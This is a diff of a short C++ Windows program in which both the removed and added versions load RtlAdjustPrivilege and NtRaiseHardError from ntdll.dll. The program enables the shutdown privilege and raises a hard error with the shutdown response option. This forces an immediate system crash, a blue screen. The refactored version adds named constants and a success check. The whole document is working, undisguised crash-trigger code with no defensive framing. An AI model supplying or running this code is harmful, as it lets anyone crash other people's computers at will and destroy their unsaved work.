@@ -1,23 +1,31 @@
 #include <Windows.h>
-#include <winternl.h>
+#include <ntstatus.h>
 
-using namespace std;
+#define SHUTDOWN_PRIVILEGE 19
+#define OPTION_SHUTDOWN 6
 
-typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
-                                               ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters,
-                                               ULONG ResponseOption, PULONG Response);
+// function definitions
+typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege) (
+        ULONG privilege,
+        BOOLEAN enable,
+        BOOLEAN current_thread,
+        PBOOLEAN enabled);
+typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(
+        NTSTATUS error_status,
+        ULONG number_of_parameters,
+        ULONG unicode_string_parameter_mask,
+        PULONG_PTR parameters,
+        ULONG response_option,
+        PULONG reponse);
 
-typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread,
-                                                 PBOOLEAN Enabled);
-
-int main() {
-    BOOLEAN bEnabled;
-    ULONG uResp;
-    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
-    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
-    auto NtCall = (pdef_RtlAdjustPrivilege) lpFuncAddress;
-    auto NtCall2 = (pdef_NtRaiseHardError) lpFuncAddress2;
-    NtCall(19, TRUE, FALSE, &bEnabled);
-    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, nullptr, 6, &uResp);
-    return 0;
+int main()
+{
+    auto RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+    BOOLEAN enabled;
+    if (RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enabled) == 0)
+    {
+        auto NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtRaiseHardError");
+        ULONG response;
+        NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, nullptr, OPTION_SHUTDOWN, &response);
+    }
 }
